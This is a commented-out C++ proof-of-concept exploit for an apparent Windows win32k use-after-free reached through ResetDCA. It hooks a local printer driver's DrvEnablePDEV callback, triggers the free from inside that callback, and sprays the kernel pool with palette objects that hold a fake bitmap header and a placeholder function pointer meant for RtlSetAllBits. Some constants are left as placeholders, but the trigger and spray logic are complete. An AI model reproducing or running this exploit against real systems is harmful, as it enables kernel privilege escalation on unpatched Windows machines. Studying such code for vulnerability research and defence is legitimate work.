//#include <Windows.h>
//#include <winddi.h>
//#include <stdio.h>
//
//typedef BOOL(*pDrvEnableDriver)(
//	ULONG iEngineVersion,
//	ULONG cj,
//	DRVENABLEDATA* pded
//	);
//
//typedef void (*pDrvDisableDriver)();
//DHPDEV FakeDrvEnablePDEV
//(	DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
//	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
//	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
//
//typedef DHPDEV(*pDrvEnablePDEV)
//(	DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
//	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
//	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
//
//namespace global
//{
//	LPSTR pPrinterName = nullptr;
//	DRVFN fakeDrvfn{ INDEX_DrvEnablePDEV , (PFN)FakeDrvEnablePDEV };
//	DRVFN realDrvfn{ INDEX_DrvEnablePDEV, nullptr };
//	BOOL TriggerBugFlag = FALSE;
//	HDC hdc = 0;
//	ULONG64 fakeBitmapHeader = 0x4141414141414141;
//	ULONG64 rtlSetAllBits = 0x6161616161616161;
//}
//
//void ErrorOutput(const char* msg)
//{
//	printf(msg);
//	printf("[-] Error code: %d\n", GetLastError());
//}
//
//void PoolSpray()
//{
//	// initialize the PLOGPALETTE
//	DWORD devobjSize = 0xe20;
//	DWORD palNumEntries = (devobjSize - 0x90) / 4;
//	DWORD bufSize = sizeof(LOGPALETTE) + (palNumEntries) * sizeof(PALETTEENTRY);
//	PLOGPALETTE pLogPalette = (PLOGPALETTE)malloc(bufSize);
//	if (!pLogPalette)
//	{
//		ErrorOutput("[-] Failed to allocate a buffer for PLOGPALETTE\n");
//		exit(1);
//	}
//	pLogPalette->palVersion = 0x300;
//	pLogPalette->palNumEntries = palNumEntries;
//
//	// make the pool fengshui
//	PULONG64 paletteData = (PULONG64)pLogPalette->palPalEntry;
//
//	// control the arg1(fake BitMapHeader)
//	for (DWORD i = 0; i < 0x140; ++i)
//	{
//		paletteData[i] = global::fakeBitmapHeader;
//	}
//
//	// control the function pointer(rtlSetAllBits)
//	for (DWORD i = 0x140; i < (palNumEntries * 4) / 8; ++i)
//	{
//		paletteData[i] = global::rtlSetAllBits;
//	}
//
//	// start to make pool spray
//	for (DWORD i = 0; i < 5000; ++i)
//	{
//		CreatePalette(pLogPalette);
//	}
//}
//
//DHPDEV FakeDrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
//	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
//	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
//{
//	printf("[+] Enter the fake callback\n");
//	// call the true function
//	pDrvEnablePDEV DrvEnablePDEV = (pDrvEnablePDEV)global::realDrvfn.pfn;
//	DHPDEV result = DrvEnablePDEV(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
//	if (global::TriggerBugFlag)
//	{
//		global::TriggerBugFlag = FALSE;
//		printf("[+] Trigger the uaf bug\n");
//	
//		ResetDCA(global::hdc, nullptr);
//		
//		printf("[+] Start pool spray\n");
//		PoolSpray();
//		printf("[+] Finish pool spray\n");
//	}
//	return result;
//}
//
//// find an available printer and hook its user callback
//BOOL HookUserCallbackEntry()
//{
//	// get the buffer size to store the PRINTER_INFO_4 structures
//	DWORD needBytes = 0, returnCount = 0;
//	EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, nullptr, 0, &needBytes, &returnCount);
//	if (!needBytes) {
//		ErrorOutput("[-] Failed to get buffer size for printer structures\n");
//		exit(1);
//	}
//
//	// allocate a buffer to store the PRINTER_INFO_4 structures 
//	PPRINTER_INFO_4A pPrinterArray = (PPRINTER_INFO_4A)malloc(needBytes);
//	if (!pPrinterArray) {
//		ErrorOutput("[-] Failed to allocate a buffer for printer structures\n");
//		exit(1);
//	}
//	if (!EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, (LPBYTE)pPrinterArray, needBytes, &needBytes, &returnCount)) {
//		ErrorOutput("[-] Failed to enum printers\n");
//		exit(1);
//	}
//
//	PRINTER_INFO_4A pPrinterInfo = { 0 };
//	// enum printer structure array
//	for (DWORD idx = 0; idx < returnCount; ++idx)
//	{
//		pPrinterInfo = pPrinterArray[idx];
//		if (!pPrinterInfo.pPrinterName)
//			continue;
//		printf("[+] Try the printer: %s\n", pPrinterInfo.pPrinterName);
//
//		// open the printer
//		HANDLE hPrinter;
//		if (!OpenPrinterA(pPrinterInfo.pPrinterName, &hPrinter, nullptr))
//		{
//			ErrorOutput("[-] Failed to open the printer\n");
//			continue;
//		}
//		printf("[+] Open the driver: %s\n", pPrinterInfo.pPrinterName);
//
//		// get the driver path
//		needBytes = 0;
//		GetPrinterDriverA(hPrinter, nullptr, 2, nullptr, 0, &needBytes);
//		if (!needBytes)
//		{
//			ErrorOutput("[-] Failed to get buffer size for printer driver structures\n");
//			continue;
//		}
//		PDRIVER_INFO_2A pDriverArray = (PDRIVER_INFO_2A)malloc(needBytes);
//		if (!pDriverArray)
//			ErrorOutput("[-] Failed to allocate a buffer for driver structures\n");
//		if (!GetPrinterDriverA(hPrinter, nullptr, 2, (LPBYTE)pDriverArray, needBytes, &needBytes))
//		{
//			ErrorOutput("[-] Failed to enum the printer drivers\n");
//			continue;
//		}
//		printf("[+] Driver path: %s\n", pDriverArray->pDriverPath);
//
//		// load the driver to memory with the absolute path
//		HMODULE hDriver = LoadLibraryExA(pDriverArray->pDriverPath, nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
//		if (!hDriver)
//		{
//			ErrorOutput("[-] Failed to load the driver to memory\n");
//			continue;
//		}
//		global::pPrinterName = pPrinterInfo.pPrinterName;
//
//		// get the function address
//		pDrvEnableDriver DrvEnableDriver = nullptr;
//		pDrvDisableDriver DrvDisableDriver = nullptr;
//		DrvEnableDriver = (pDrvEnableDriver)GetProcAddress(hDriver, "DrvEnableDriver");
//		DrvDisableDriver = (pDrvDisableDriver)GetProcAddress(hDriver, "DrvDisableDriver");
//		if (!DrvEnableDriver || !DrvDisableDriver)
//		{
//			ErrorOutput("[-] Failed to get the function address\n");
//			continue;
//		}
//		printf("[+] Get the DrvEnableDriver address: 0x%I64x\n", (ULONG64)DrvEnableDriver);
//		printf("[+] Get the DrvDisableDriver address: 0x%I64x\n", (ULONG64)DrvDisableDriver);
//
//		// get the driver's callback table
//		DRVENABLEDATA drvEnableData;
//		if (!DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(drvEnableData), &drvEnableData))
//		{
//			ErrorOutput("[-] Failed to get the drvEnableData\n");
//			continue;
//		}
//
//		// enable the driver notice!!!
//		DWORD protectValue = 0;
//		if (!VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), PAGE_READWRITE, &protectValue))
//		{
//			ErrorOutput("[-] Failed to unprotecy the callback table\n");
//			continue;
//		}
//
//		// hook the callback table entry 
//		for (DWORD idx = 0; idx < drvEnableData.c; ++idx)
//		{
//			if (drvEnableData.pdrvfn[idx].iFunc == global::fakeDrvfn.iFunc)
//			{
//				global::realDrvfn.pfn = drvEnableData.pdrvfn[idx].pfn;
//				drvEnableData.pdrvfn[idx].pfn = global::fakeDrvfn.pfn;
//				break;
//			}
//		}
//
//		// diable the driver
//		DrvDisableDriver();
//
//		// reprotect the callback table
//		VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), protectValue, &protectValue);
//
//		printf("[+] Get real callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::realDrvfn.pfn);
//		printf("[+] Get fake callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::fakeDrvfn.pfn);
//		return TRUE;
//	}
//
//	return FALSE;
//}
//
//int main()
//{
//	BOOL res = HookUserCallbackEntry();
//	if (!res)
//	{
//		ErrorOutput("[-] Failed to hook the callback table\n");
//		exit(1);
//	}
//	global::hdc = CreateDCA(nullptr, global::pPrinterName, nullptr, nullptr);
//	if (!global::hdc)
//	{
//		ErrorOutput("[-] Failed to create dc\n");
//		exit(1);
//	}
//	
//	global::TriggerBugFlag = TRUE;
//	ResetDCA(global::hdc, nullptr);
//	return 0;
//}